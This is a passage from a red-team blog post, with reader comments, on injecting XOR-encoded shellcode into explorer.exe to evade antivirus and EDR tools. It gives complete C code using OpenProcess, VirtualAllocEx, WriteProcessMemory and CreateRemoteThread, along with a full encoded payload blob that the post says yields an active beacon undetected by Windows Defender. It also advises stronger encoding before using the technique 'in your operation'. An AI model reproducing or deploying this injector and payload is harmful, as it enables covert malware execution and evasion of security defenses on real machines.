<p>This code will take the process id that you want to get a handle for as a first argument to the code, then it will use OpenProcess() with PROCESS_ALL_ACCESS access right to open the process and save the handle in the variable process and finally, it will print the handle for us.</p>



<p>The OpenProcess() function actually takes 3 parameters you can check them via <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">this page</a>.</p>



<p>Also,  You can check all access rights <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights">from this page</a>.</p>



<p>And after compiling the code and run it to retrieve the handle of the process &#8220;explorer.exe&#8221; with pid 4032, we will get the following:</p>



<figure class="wp-block-image"><img src="https://shells.systems/wp-content/uploads/2020/07/get-handle.png" alt="" class="wp-image-1378"/></figure>



<p>We retrieved the handle successfully. </p>



<h4>Allocate space on the remote process</h4>



<p>Next step after retrieving the handle will be Allocating space inside that process, we can do that using <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx()</a> using the following code:</p>


<pre class="brush: cpp; highlight: [7,25,26,29]; title: ; notranslate" title="">
#include &amp;lt;windows.h&amp;gt;


int main(int argc, char *argv[]){


   char data[] = &amp;quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot;;
   
  // The PID that you want to use
   int process_id = atoi(argv[1]);

  // Declare a new handle as process variable
  // PROCESS_ALL_ACCESS
  HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);

  // If the operation succeeded it will return the handle
  if(process){
    printf(&amp;quot;[+] Handle retrieved successfully!\n&amp;quot;);

    // We can print it as pointer using printf
    printf(&amp;quot;[+] Handle value is %p\n&amp;quot;, process);
    
    // Allocate space
    // Define the base_address variable which will save the allocated memory address
	LPVOID base_address;
    base_address = VirtualAllocEx(process, NULL, sizeof(data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if(base_address){

        printf(&amp;quot;[+] Allocated based address is 0x%x\n&amp;quot;, base_address);

	}else{
		printf(&amp;quot;[-] Unable to allocate memory ...\n&amp;quot;);
	}
    
  }else{
    printf(&amp;quot;[-] Unable to retrieve process handle\n&amp;quot;);
  }

}
</pre>



<p>I added some data in line #7 as a dump data (will be replaced with our shellcode), we should have it to allocate the memory based on its size.</p>



<p>In line #25 we declared a variable called &#8220;base_address&#8221; as LPVOID which will represent the base address of the allocated memory.</p>



<p>And in line #26 we use VirtualAllocEx() and pass the following parameters for it:</p>



<ul><li>process: which is the handle that we retrieved earlier using OpenProcess()</li><li>Null: to make sure that the function will allocate address automatically instead of using one that we know.</li><li>sizeof(data): the size of the data that will be written to memory.</li><li>MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE: the allocation type that we want to use, which describe what we want to do inside that allocated region of memory which is read write execute (RWX)</li></ul>



<blockquote class="wp-block-quote"><p>Allocating memory region with RWX it&#8217;s not very stealthy, and the EDRs could consider it as suspicious action. </p></blockquote>



<p>And finally, in line #29 we will print the address of the allocated memory, which we will write our data on, and by running the code we will get the following:</p>



<figure class="wp-block-image"><img src="https://shells.systems/wp-content/uploads/2020/07/VirtualAlloc-process.png" alt="" class="wp-image-1395"/></figure>



<p>We got the address &#8220;0xa50000&#8221; as our base address.</p>



<p>Let me explain that more and tell you what that address exactly means, and to do that, I will attach my debugger to explorer.exe and see what we have at that address:</p>



<figure class="wp-block-image"><img src="https://shells.systems/wp-content/uploads/2020/07/x64dbg-attach-explorer.png" alt="" class="wp-image-1396"/></figure>



<p>Then I will go to the address &#8220;0xa50000&#8221; like the following:</p>



<figure class="wp-block-image"><img src="https://shells.systems/wp-content/uploads/2020/07/goto-address.png" alt="" class="wp-image-1397"/></figure>



<p>Choose expression and enter the address:</p>



<figure class="wp-block-image"><img src="https://shells.systems/wp-content/uploads/2020/07/goto2.png" alt="" class="wp-image-1398"/></figure>



<p>To get the following results:</p>



<figure class="wp-block-image"><img src="https://shells.systems/wp-content/uploads/2020/07/space-allocated.png" alt="" class="wp-image-1399"/></figure>



<p>As we can see, the function VirtualAllocEx has allocated memory space in explorer.exe for us and we are ready to write our data.</p>



<h4>Write data to memory</h4>



<p>Now here is the most important part of our technique, we will decode the original opcodes and write it directly to memory, we will do that by start writing our data from &#8220;0xA50000&#8221; and increase the address one by one reach the next memory address.</p>



<p>We used xor to encode our shellcode, now we will use the same value to decode each byte and retrieve the original status of each opcode, and that is an example about this operation:</p>


<pre class="brush: python; title: ; notranslate" title="">
hex(ord(&quot;\xfc&quot;) ^ 0x01) # = 0xfd
hex(ord&quot;\xfd&quot;) ^ 0x01) # = 0xfc 
</pre>



<p>So by XORing each opcode with 0x01, we will retrieve the original shellcode but this time without getting caught via static analysis (signature-based) detection by AVs/EDRs because it will be written directly to the memory in runtime.</p>



<blockquote class="wp-block-quote"><p>Even with this type of encoding your payload may get flagged, so make sure to use stronger encoding and test it before using in your operation.</p></blockquote>



<p>The following code will achieve that for us:</p>


<pre class="brush: cpp; highlight: [39,42,45,51]; title: ; notranslate" title="">
#include &amp;lt;windows.h&amp;gt;


int main(int argc, char *argv[]){



   unsigned char data[] = &amp;quot;\xfd\x49\x82\xe5\xf1\xe9\xc9\x1\x1\x1\x40\x50\x40\x51\x53\x50\x57\x49\x30\xd3\x64\x49\x8a\x53\x61\x49\x8a\x53\x19\x49\x8a\x53\x21\x49\x8a\x73\x51\x49\xe\xb6\x4b\x4b\x4c\x30\xc8\x49\x30\xc1\xad\x3d\x60\x7d\x3\x2d\x21\x40\xc0\xc8\xc\x40\x0\xc0\xe3\xec\x53\x40\x50\x49\x8a\x53\x21\x8a\x43\x3d\x49\x0\xd1\x67\x80\x79\x19\xa\x3\x74\x73\x8a\x81\x89\x1\x1\x1\x49\x84\xc1\x75\x66\x49\x0\xd1\x51\x8a\x49\x19\x45\x8a\x41\x21\x48\x0\xd1\xe2\x57\x49\xfe\xc8\x40\x8a\x35\x89\x49\x0\xd7\x4c\x30\xc8\x49\x30\xc1\xad\x40\xc0\xc8\xc\x40\x0\xc0\x39\xe1\x74\xf0\x4d\x2\x4d\x25\x9\x44\x38\xd0\x74\xd9\x59\x45\x8a\x41\x25\x48\x0\xd1\x67\x40\x8a\xd\x49\x45\x8a\x41\x1d\x48\x0\xd1\x40\x8a\x5\x89\x49\x0\xd1\x40\x59\x40\x59\x5f\x58\x5b\x40\x59\x40\x58\x40\x5b\x49\x82\xed\x21\x40\x53\xfe\xe1\x59\x40\x58\x5b\x49\x8a\x13\xe8\x4e\xfe\xfe\xfe\x5c\x6b\x1\x48\xbf\x76\x68\x6f\x68\x6f\x64\x75\x1\x40\x57\x48\x88\xe7\x4d\x88\xf0\x40\xbb\x4d\x76\x27\x6\xfe\xd4\x49\x30\xc8\x49\x30\xd3\x4c\x30\xc1\x4c\x30\xc8\x40\x51\x40\x51\x40\xbb\x3b\x57\x78\xa6\xfe\xd4\xea\x72\x5b\x49\x88\xc0\x40\xb9\x57\x1e\x1\x1\x4c\x30\xc8\x40\x50\x40\x50\x6b\x2\x40\x50\x40\xbb\x56\x88\x9e\xc7\xfe\xd4\xea\x58\x5a\x49\x88\xc0\x49\x30\xd3\x48\x88\xd9\x4c\x30\xc8\x53\x69\x1\x3\x41\x85\x53\x53\x40\xbb\xea\x54\x2f\x3a\xfe\xd4\x49\x88\xc7\x49\x82\xc2\x51\x6b\xb\x5e\x49\x88\xf0\x49\x88\xdb\x48\xc6\xc1\xfe\xfe\xfe\xfe\x4c\x30\xc8\x53\x53\x40\xbb\x2c\x7\x19\x7a\xfe\xd4\x84\xc1\xe\x84\x9c\x0\x1\x1\x49\xfe\xce\xe\x85\x8d\x0\x1\x1\xea\xd2\xe8\xe5\x0\x1\x1\xe9\xa3\xfe\xfe\xfe\x2e\x34\x6f\x6a\x4e\x1\x2\x9b\xf5\xba\xe1\xdc\x3f\x6d\x86\xa4\x4\x4a\x83\x50\x2e\xd4\x69\x66\x14\xd7\xfc\x11\xf2\xa4\x91\x61\xeb\xbb\xff\x1e\x27\x2c\x5\xf2\xed\xca\xd5\x72\x95\x56\x99\x5f\xdf\xed\xb9\x3f\xd8\x4f\x33\xcd\x39\xe2\x95\x7\x1c\x72\x2c\xb2\xd5\x63\x27\xcb\x5b\xaf\x53\xee\xf5\xc1\x80\x76\x96\xcf\xd4\x1\x54\x72\x64\x73\x2c\x40\x66\x64\x6f\x75\x3b\x21\x4c\x6e\x7b\x68\x6d\x6d\x60\x2e\x35\x2f\x31\x21\x29\x62\x6e\x6c\x71\x60\x75\x68\x63\x6d\x64\x3a\x21\x4c\x52\x48\x44\x21\x39\x2f\x31\x3a\x21\x56\x68\x6f\x65\x6e\x76\x72\x21\x4f\x55\x21\x34\x2f\x30\x3a\x21\x55\x73\x68\x65\x64\x6f\x75\x2e\x35\x2f\x31\x3a\x21\x46\x55\x43\x36\x2f\x35\x3a\x21\x48\x6f\x67\x6e\x51\x60\x75\x69\x2f\x33\x28\xc\xb\x1\x60\xe3\x48\x6d\xb4\x30\x93\x21\x18\xc8\xab\x68\x2a\xbd\xc0\x8a\x29\xf8\x81\x6d\x93\xad\xbb\xeb\x7\x33\x4\xc3\x39\x1a\xe\x3f\x84\x38\xc2\x8b\x13\x20\xe6\x50\x81\x81\x31\x3\xe6\xcd\x8e\x35\x39\xd0\xe3\x49\xf1\x29\x20\xe8\xd6\xa7\x46\x59\xf\x49\x8d\x1c\x17\xac\x7c\xac\xbc\xa5\x41\x59\x4a\x5e\x3c\xa8\xd1\x54\x18\xde\x42\xf0\x68\xbb\xd\x80\x6e\x90\x73\x95\xc7\x64\xb5\x8c\x5a\x5\x59\x69\x73\x92\xc2\xbd\x47\x10\xa\xf9\x51\x27\x53\x14\x48\xda\x37\xc\x74\x5c\x80\x5c\x46\x1a\xe\x5f\x24\x51\x35\x22\xc0\x68\xfc\x23\x74\x5c\xeb\xa5\x2f\x41\x99\x13\x73\x8f\xd5\xdf\xee\xf3\x43\xdc\x9\x6a\xa2\x75\x12\x6d\xa8\x83\xfd\x24\xed\xe7\x23\xeb\x9a\x4a\x59\xa9\x84\x66\xa0\x79\x1f\xab\x6\x30\xd6\xce\x4b\x75\xf0\x31\x62\x3f\xf\x5d\x16\x52\x2e\x68\x66\x93\xf9\x29\xff\xd7\x6e\xcf\x7\xc4\xdc\xb3\xc\x70\xf5\xdb\x19\x5f\x27\x1\x40\xbf\xf1\xb4\xa3\x57\xfe\xd4\x49\x30\xc8\xbb\x1\x1\x41\x1\x40\xb9\x1\x11\x1\x1\x40\xb8\x41\x1\x1\x1\x40\xbb\x59\xa5\x52\xe4\xfe\xd4\x49\x92\x52\x52\x49\x88\xe6\x49\x88\xf0\x49\x88\xdb\x40\xb9\x1\x21\x1\x1\x48\x88\xf8\x40\xbb\x13\x97\x88\xe3\xfe\xd4\x49\x82\xc5\x21\x84\xc1\x75\xb7\x67\x8a\x6\x49\x0\xc2\x84\xc1\x74\xd6\x59\x59\x59\x49\x4\x1\x1\x1\x1\x51\xc2\xe9\x9e\xfc\xfe\xfe\x30\x31\x2f\x31\x2f\x31\x2f\x30\x1\x59\x57\x3c\xd3&amp;quot;;
   
  // The PID that you want to use
   int process_id = atoi(argv[1]);

  // Declare a new handle as process variable
  // PROCESS_ALL_ACCESS
  HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);

  // If the operation succeeded it will return the handle
  if(process){
    printf(&amp;quot;[+] Handle retrieved successfully!\n&amp;quot;);

    // We can print it as pointer using printf
    printf(&amp;quot;[+] Handle value is %p\n&amp;quot;, process);
    
    // Allocate space
    // Define the base_address variable which will save the allocated memory address
	LPVOID base_address;
    base_address = VirtualAllocEx(process, NULL, sizeof(data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if(base_address){

        printf(&amp;quot;[+] Allocated based address is 0x%x\n&amp;quot;, base_address);
        
        				// Data chars counter
				int i;

				// Base address counter
				int n = 0;


				for(i = 0; i&amp;lt;=sizeof(data); i++){

					// Decode shellcode opcode
					char DecodedOpCode = data[i] ^ 0x01;

					// Write the decoded bytes in memory address
					if(WriteProcessMemory(process, base_address+n, &amp;amp;DecodedOpCode, 1, NULL)){


						printf(&amp;quot;[+] Byte wrote sucessfully!\n&amp;quot;);

						// Increase memory address by 1
						n++;
					}
				}
        

	}else{
		printf(&amp;quot;[-] Unable to allocate memory ...\n&amp;quot;);
	}
    
  }else{
    printf(&amp;quot;[-] Unable to retrieve process handle\n&amp;quot;);
  }

}
</pre>



<p>This code will write our shellcode in memory after decoding each byte of it with our key &#8220;0x01&#8221;, as we can see in line #39 I used a for loop to move on each element of our shellcode, then in line #42 I XORed each element with 0x01 to retrieve the original opcode, and in line #45 I wrote that decoded byte to a specific location in memory and finally in line #51 I move the n counter which is the memory counter to the next memory address to decode and write the opcode to.</p>



<p>The <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory()</a> took the following parameters:</p>



<ul><li>process: which is the handle that we retrieved earlier using OpenProcess()</li><li>base_address+n: which is the address that we want to write our opcode to (base_address retrieved from VirtualAllocEx) and n is the counter to move to the next address.</li><li>&amp;DecodedOpCode: the address of our DecodedOpCode byte.</li><li>1: the number of written bytes which is only one byte.</li><li>Null: Because we don&#8217;t have a pointer to receive the number of written bytes.</li></ul>



<p>You can check the parameters that the WriteProcessMemory takes from <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">this page.</a></p>



<p>After compiling the program and run it, we will get the following:</p>



<ul class="wp-block-gallery columns-1 is-cropped"><li class="blocks-gallery-item"><figure><img src="https://shells.systems/wp-content/uploads/2020/07/Byte-opcode-wrote.png" alt="" data-id="1415" data-link="https://shells.systems/?attachment_id=1415" class="wp-image-1415"/></figure></li></ul>



<p>As we can see, we get each byte wrote in the desired address that we want, now, let&#8217;s debug that using x64dbg and go to the address &#8220;0x2ec0000&#8221; to get the following:</p>



<figure class="wp-block-image"><img src="https://shells.systems/wp-content/uploads/2020/07/Shellcode-Wrote.png" alt="" class="wp-image-1416"/></figure>



<p>As we can see, our original bytes were written to the addresses that we want starting from 0x2ec0000 and everything is working very well! </p>



<h4>Executing the shellcode</h4>



<p>Finally, we need to execute the shellcode as a thread, and to do that, we can that using CreateRemoteThread() function using the following code:</p>


<pre class="brush: cpp; highlight: [55]; title: ; notranslate" title="">
#include &amp;lt;windows.h&amp;gt;


int main(int argc, char *argv[]){


   unsigned char data[] = &amp;quot;\xfd\x49\x82\xe5\xf1\xe9\xc9\x1\x1\x1\x40\x50\x40\x51\x53\x50\x57\x49\x30\xd3\x64\x49\x8a\x53\x61\x49\x8a\x53\x19\x49\x8a\x53\x21\x49\x8a\x73\x51\x49\xe\xb6\x4b\x4b\x4c\x30\xc8\x49\x30\xc1\xad\x3d\x60\x7d\x3\x2d\x21\x40\xc0\xc8\xc\x40\x0\xc0\xe3\xec\x53\x40\x50\x49\x8a\x53\x21\x8a\x43\x3d\x49\x0\xd1\x67\x80\x79\x19\xa\x3\x74\x73\x8a\x81\x89\x1\x1\x1\x49\x84\xc1\x75\x66\x49\x0\xd1\x51\x8a\x49\x19\x45\x8a\x41\x21\x48\x0\xd1\xe2\x57\x49\xfe\xc8\x40\x8a\x35\x89\x49\x0\xd7\x4c\x30\xc8\x49\x30\xc1\xad\x40\xc0\xc8\xc\x40\x0\xc0\x39\xe1\x74\xf0\x4d\x2\x4d\x25\x9\x44\x38\xd0\x74\xd9\x59\x45\x8a\x41\x25\x48\x0\xd1\x67\x40\x8a\xd\x49\x45\x8a\x41\x1d\x48\x0\xd1\x40\x8a\x5\x89\x49\x0\xd1\x40\x59\x40\x59\x5f\x58\x5b\x40\x59\x40\x58\x40\x5b\x49\x82\xed\x21\x40\x53\xfe\xe1\x59\x40\x58\x5b\x49\x8a\x13\xe8\x4e\xfe\xfe\xfe\x5c\x6b\x1\x48\xbf\x76\x68\x6f\x68\x6f\x64\x75\x1\x40\x57\x48\x88\xe7\x4d\x88\xf0\x40\xbb\x4d\x76\x27\x6\xfe\xd4\x49\x30\xc8\x49\x30\xd3\x4c\x30\xc1\x4c\x30\xc8\x40\x51\x40\x51\x40\xbb\x3b\x57\x78\xa6\xfe\xd4\xea\x72\x5b\x49\x88\xc0\x40\xb9\x57\x1e\x1\x1\x4c\x30\xc8\x40\x50\x40\x50\x6b\x2\x40\x50\x40\xbb\x56\x88\x9e\xc7\xfe\xd4\xea\x58\x5a\x49\x88\xc0\x49\x30\xd3\x48\x88\xd9\x4c\x30\xc8\x53\x69\x1\x3\x41\x85\x53\x53\x40\xbb\xea\x54\x2f\x3a\xfe\xd4\x49\x88\xc7\x49\x82\xc2\x51\x6b\xb\x5e\x49\x88\xf0\x49\x88\xdb\x48\xc6\xc1\xfe\xfe\xfe\xfe\x4c\x30\xc8\x53\x53\x40\xbb\x2c\x7\x19\x7a\xfe\xd4\x84\xc1\xe\x84\x9c\x0\x1\x1\x49\xfe\xce\xe\x85\x8d\x0\x1\x1\xea\xd2\xe8\xe5\x0\x1\x1\xe9\xa3\xfe\xfe\xfe\x2e\x34\x6f\x6a\x4e\x1\x2\x9b\xf5\xba\xe1\xdc\x3f\x6d\x86\xa4\x4\x4a\x83\x50\x2e\xd4\x69\x66\x14\xd7\xfc\x11\xf2\xa4\x91\x61\xeb\xbb\xff\x1e\x27\x2c\x5\xf2\xed\xca\xd5\x72\x95\x56\x99\x5f\xdf\xed\xb9\x3f\xd8\x4f\x33\xcd\x39\xe2\x95\x7\x1c\x72\x2c\xb2\xd5\x63\x27\xcb\x5b\xaf\x53\xee\xf5\xc1\x80\x76\x96\xcf\xd4\x1\x54\x72\x64\x73\x2c\x40\x66\x64\x6f\x75\x3b\x21\x4c\x6e\x7b\x68\x6d\x6d\x60\x2e\x35\x2f\x31\x21\x29\x62\x6e\x6c\x71\x60\x75\x68\x63\x6d\x64\x3a\x21\x4c\x52\x48\x44\x21\x39\x2f\x31\x3a\x21\x56\x68\x6f\x65\x6e\x76\x72\x21\x4f\x55\x21\x34\x2f\x30\x3a\x21\x55\x73\x68\x65\x64\x6f\x75\x2e\x35\x2f\x31\x3a\x21\x46\x55\x43\x36\x2f\x35\x3a\x21\x48\x6f\x67\x6e\x51\x60\x75\x69\x2f\x33\x28\xc\xb\x1\x60\xe3\x48\x6d\xb4\x30\x93\x21\x18\xc8\xab\x68\x2a\xbd\xc0\x8a\x29\xf8\x81\x6d\x93\xad\xbb\xeb\x7\x33\x4\xc3\x39\x1a\xe\x3f\x84\x38\xc2\x8b\x13\x20\xe6\x50\x81\x81\x31\x3\xe6\xcd\x8e\x35\x39\xd0\xe3\x49\xf1\x29\x20\xe8\xd6\xa7\x46\x59\xf\x49\x8d\x1c\x17\xac\x7c\xac\xbc\xa5\x41\x59\x4a\x5e\x3c\xa8\xd1\x54\x18\xde\x42\xf0\x68\xbb\xd\x80\x6e\x90\x73\x95\xc7\x64\xb5\x8c\x5a\x5\x59\x69\x73\x92\xc2\xbd\x47\x10\xa\xf9\x51\x27\x53\x14\x48\xda\x37\xc\x74\x5c\x80\x5c\x46\x1a\xe\x5f\x24\x51\x35\x22\xc0\x68\xfc\x23\x74\x5c\xeb\xa5\x2f\x41\x99\x13\x73\x8f\xd5\xdf\xee\xf3\x43\xdc\x9\x6a\xa2\x75\x12\x6d\xa8\x83\xfd\x24\xed\xe7\x23\xeb\x9a\x4a\x59\xa9\x84\x66\xa0\x79\x1f\xab\x6\x30\xd6\xce\x4b\x75\xf0\x31\x62\x3f\xf\x5d\x16\x52\x2e\x68\x66\x93\xf9\x29\xff\xd7\x6e\xcf\x7\xc4\xdc\xb3\xc\x70\xf5\xdb\x19\x5f\x27\x1\x40\xbf\xf1\xb4\xa3\x57\xfe\xd4\x49\x30\xc8\xbb\x1\x1\x41\x1\x40\xb9\x1\x11\x1\x1\x40\xb8\x41\x1\x1\x1\x40\xbb\x59\xa5\x52\xe4\xfe\xd4\x49\x92\x52\x52\x49\x88\xe6\x49\x88\xf0\x49\x88\xdb\x40\xb9\x1\x21\x1\x1\x48\x88\xf8\x40\xbb\x13\x97\x88\xe3\xfe\xd4\x49\x82\xc5\x21\x84\xc1\x75\xb7\x67\x8a\x6\x49\x0\xc2\x84\xc1\x74\xd6\x59\x59\x59\x49\x4\x1\x1\x1\x1\x51\xc2\xe9\x9e\xfc\xfe\xfe\x30\x31\x2f\x31\x2f\x31\x2f\x30\x1\x59\x57\x3c\xd3&amp;quot;;
   
  // The PID that you want to use
   int process_id = atoi(argv[1]);

  // Declare a new handle as process variable
  // PROCESS_ALL_ACCESS
  HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);

  // If the operation succeeded it will return the handle
  if(process){
    printf(&amp;quot;[+] Handle retrieved successfully!\n&amp;quot;);

    // We can print it as pointer using printf
    printf(&amp;quot;[+] Handle value is %p\n&amp;quot;, process);
    
    // Allocate space
    // Define the base_address variable which will save the allocated memory address
	LPVOID base_address;
    base_address = VirtualAllocEx(process, NULL, sizeof(data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if(base_address){

        printf(&amp;quot;[+] Allocated based address is 0x%x\n&amp;quot;, base_address);
        
        				// Data chars counter
				int i;

				// Base address counter
				int n = 0;


				for(i = 0; i&amp;lt;=sizeof(data); i++){

					// Decode shellcode opcode
					char DecodedOpCode = data[i] ^ 0x01;

					// Write the decoded bytes in memory address
					if(WriteProcessMemory(process, base_address+n, &amp;amp;DecodedOpCode, 1, NULL)){


						printf(&amp;quot;[+] Byte wrote sucessfully!\n&amp;quot;);

						// Increase memory address by 1
						n++;
					}
				}
				
				// Run our code as RemoteThread
				CreateRemoteThread(process, NULL, 100,(LPTHREAD_START_ROUTINE)base_address, NULL, 0, 0x5151);

        

	}else{
		printf(&amp;quot;[-] Unable to allocate memory ...\n&amp;quot;);
	}
    
  }else{
    printf(&amp;quot;[-] Unable to retrieve process handle\n&amp;quot;);
  }

}
</pre>



<p>As we can see in line #55, we used CreateRemoteThread() function to execute our shellcode as a thread on explorer.exe, and  CreateRemoteThread() took the following parameters:</p>



<ul><li>process: Which is the handle that we retrieved earlier using OpenProcess()</li><li>Null: To get default security descriptor; <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">check this</a> for more info.</li><li>100: The initial size of the stack.</li><li>base_address: Which is the first opcode of our shellcode.</li><li>Null: No parameters passed to the thread.</li><li>0: The thread runs immediately after creation.</li><li>0x5151: Thread ID</li></ul>



<p>And after running the code, we will get the following:</p>



<figure class="wp-block-image"><img src="https://shells.systems/wp-content/uploads/2020/07/Shellcode-Wrote-CreateRemoteThread.png" alt="" class="wp-image-1434"/></figure>



<figure class="wp-block-image"><img src="https://shells.systems/wp-content/uploads/2020/07/Final-Beacon.png" alt="" class="wp-image-1435"/></figure>



<p>We got an active beacon running under explorer.exe without being caught by Windows Defender.</p>



<h4>Conclusion</h4>



<p>By encoding our shellcode and decode it using this technique, we were able to bypass AV protection easily and run our shellcode inside another process.</p>



<p>You can customize the encoder as you want but you have to edit the decoder too, also you can modify the code to meet your needs on execution and some parts of the code are written only for educational purposes.<br></p>
	</div><!-- .entry-content -->

	<footer class="entry-footer clearfix"><span class="cat-tags-links"><span class="cat-links"><span class="cat-icon"><i class="fa fa-folder-open"></i></span><span class="screen-reader-text">Categories</span><a href="https://shells.systems/category/red-team/" rel="category tag">Red Team</a></span><span class="tags-links"><span class="tags-icon"><i class="fa fa-hashtag" aria-hidden="true"></i></span><span class="screen-reader-text">Tags</span><a href="https://shells.systems/tag/beacon/" rel="tag">beacon</a>, <a href="https://shells.systems/tag/cobalt-strike/" rel="tag">cobalt strike</a>, <a href="https://shells.systems/tag/encoding/" rel="tag">encoding</a>, <a href="https://shells.systems/tag/process-injection/" rel="tag">process injection</a>, <a href="https://shells.systems/tag/redteam/" rel="tag">redteam</a>, <a href="https://shells.systems/tag/shellcode/" rel="tag">shellcode</a></span></span></footer>
<div class="entry-author-info clearfix">
	<div class="author-avatar">
		<img alt='' src='https://secure.gravatar.com/avatar/d6fbc3936f8273307f861bc80d82b490?s=72&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/d6fbc3936f8273307f861bc80d82b490?s=144&#038;d=mm&#038;r=g 2x' class='avatar avatar-72 photo' height='72' width='72' />	</div><!-- .author-avatar -->

	<div class="author-description">
		<p class="author-title">
			<a href="https://shells.systems/author/askar/" title="Posts by Askar" rel="author">Askar</a>		</p>
		<p class="author-bio">
			I write codes that break codes, Hacker wannabe.		</p><!-- .author-bio -->
	</div><!-- .author-description -->
</div><!-- .author-info -->
</article>

	<nav class="navigation post-navigation" role="navigation">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://shells.systems/ocs-inventory-ng-v2-7-remote-command-execution-cve-2020-14947/" rel="prev"><span class="meta-nav" aria-hidden="true">Previous</span><span class="screen-reader-text">Previous post:</span> <span class="post-title">OCS Inventory NG v2.7 Remote Command Execution (CVE-2020-14947)</span></a></div><div class="nav-next"><a href="https://shells.systems/octopus-v1-2-stable-shellcode-generation-spoofed-args-agent-and-much-more/" rel="next"><span class="meta-nav" aria-hidden="true">Next</span><span class="screen-reader-text">Next post:</span> <span class="post-title">Octopus v1.2 stable: shellcode generation, spoofed args agent &#038; much more!</span></a></div></div>
	</nav>
<div id="comments" class="comments-area">

			<h3 class="comments-title">
			5 Replies to &ldquo;In-Memory shellcode decoding to evade AVs/EDRs&rdquo;		</h3>

		
		<ol class="comment-list">
					<li id="comment-2356" class="comment even thread-even depth-1">
			<article id="div-comment-2356" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/e5aaa50e99e34320d77ece78b76b8889?s=42&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/e5aaa50e99e34320d77ece78b76b8889?s=84&#038;d=mm&#038;r=g 2x' class='avatar avatar-42 photo' height='42' width='42' />						<b class="fn">sfdota</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/#comment-2356">
							<time datetime="2020-08-25T07:48:59+00:00">
								2020-08-25 at 7:48 am							</time>
						</a>
											</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>a lot error to run the last c code</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='#comment-2356' onclick='return addComment.moveForm( "div-comment-2356", "2356", "respond", "1366" )' aria-label='Reply to sfdota'>Reply</a></div>			</article><!-- .comment-body -->
</li><!-- #comment-## -->
		<li id="comment-2781" class="pingback odd alt thread-odd thread-alt depth-1">
			<div class="comment-body">
				Pingback: <a href='https://www.ptrace-security.com/blog/weekly-it-security-news-bulletin-42/' rel='external nofollow' class='url'>Weekly IT Security News Bulletin #42 | Ptrace Security GmbH</a> 			</div>
</li><!-- #comment-## -->
		<li id="comment-2852" class="comment even thread-even depth-1">
			<article id="div-comment-2852" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/b052f117d0ec1e59afa8c34dc0ae5ed7?s=42&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/b052f117d0ec1e59afa8c34dc0ae5ed7?s=84&#038;d=mm&#038;r=g 2x' class='avatar avatar-42 photo' height='42' width='42' />						<b class="fn">zh4ck</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/#comment-2852">
							<time datetime="2020-11-02T08:29:16+00:00">
								2020-11-02 at 8:29 am							</time>
						</a>
											</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>I believe this can be improved by allocating the pages as RW first, write shellcode to it, then before CreateRemoteThread is called, change it to RWX.</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='#comment-2852' onclick='return addComment.moveForm( "div-comment-2852", "2852", "respond", "1366" )' aria-label='Reply to zh4ck'>Reply</a></div>			</article><!-- .comment-body -->
</li><!-- #comment-## -->
		<li id="comment-3823" class="comment odd alt thread-odd thread-alt depth-1">
			<article id="div-comment-3823" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/821d81c5ee681131a64ef3d39bf0daf6?s=42&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/821d81c5ee681131a64ef3d39bf0daf6?s=84&#038;d=mm&#038;r=g 2x' class='avatar avatar-42 photo' height='42' width='42' />						<b class="fn">Jason</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/#comment-3823">
							<time datetime="2021-01-12T02:30:53+00:00">
								2021-01-12 at 2:30 am							</time>
						</a>
											</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>As beginners from what we are going to start, if anyone wants to learn bypass defender , av, edr then what is your recommendation tonlearn first</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='#comment-3823' onclick='return addComment.moveForm( "div-comment-3823", "3823", "respond", "1366" )' aria-label='Reply to Jason'>Reply</a></div>			</article><!-- .comment-body -->
</li><!-- #comment-## -->
		<li id="comment-13760" class="pingback even thread-even depth-1">
			<div class="comment-body">
